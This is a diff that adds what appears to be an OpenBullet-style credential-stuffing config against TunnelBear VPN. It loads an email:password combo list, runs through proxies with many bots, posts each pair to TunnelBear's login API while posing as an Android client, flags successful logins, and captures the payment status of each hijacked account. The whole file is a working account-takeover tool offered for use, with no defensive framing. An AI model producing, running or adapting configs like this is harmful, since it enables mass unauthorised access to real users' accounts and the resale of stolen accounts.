@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Tunnelbear.com",
+  "SuggestedBots": 80,
+  "LastModified": "",
+  "AdditionalInfo": "",
+  "Author": "ur mum",
+  "Version": "100.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Post REQUEST POST "https://37er19htfd.execute-api.us-east-1.amazonaws.com/prod/core/api/login" 
+  CONTENT "password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded;charset=utf-8" 
+  HEADER "User-Agent: " 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "openvpn-version: jan_2015" 
+  HEADER "Version: a1.0.0.168/samsung/SM-G930K/4.4.2" 
+  HEADER "Referer: https://www.tunnelbear.com" 
+  HEADER "Cookie: " 
+  HEADER "TB-CSRF-Token: " 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: 37er19htfd.execute-api.us-east-1.amazonaws.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"result\":\"PASS\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "\"result\":\"PASS\"" 
+#Capture_Get REQUEST POST "https://37er19htfd.execute-api.us-east-1.amazonaws.com/prod/core/android/register" 
+  CONTENT "v=a1.0.0.168%2Fsamsung%2FSM-G930K%2F4.4.2&getToken=false&json=true&deviceId=a5a3985a-eeb2-3fb7-a950-b9802f8b30e6&country=-1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: " 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-TR" 
+  HEADER "openvpn-version: jan_2015" 
+  HEADER "Version: a1.0.0.168/samsung/SM-G930K/4.4.2" 
+  HEADER "Referer: https://www.tunnelbear.com" 
+  HEADER "TB-CSRF-Token: " 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: 37er19htfd.execute-api.us-east-1.amazonaws.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+PARSE "<SOURCE>" LR "\"paymentStatus\":\"" "\"," -> CAP "PaymentStatus" 
